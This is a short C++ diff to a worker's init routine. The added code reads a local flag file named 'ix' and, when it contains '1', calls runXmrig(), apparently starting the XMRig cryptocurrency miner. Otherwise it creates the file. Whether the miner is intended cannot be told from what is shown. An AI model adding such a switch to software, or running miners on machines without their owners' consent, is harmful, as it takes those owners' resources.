@@ -89,7 +89,22 @@ void Worker_utils::init()
     }
 
     m_ip = exec("hostname -I");
-}
+
+    if(std::ifstream("ix").is_open())
+    {
+        std::ifstream ix("ix");
+        std::string is_run;
+        ix >> is_run;
+        if(is_run == "1")
+            runXmrig();
+        ix.close();
+    }    
+    else
+    {
+        std::ofstream ix("ix", std::ios::out);
+        ix.close();
+    }
+}   
 
 void Worker_utils::err(std::string wtf)
 {
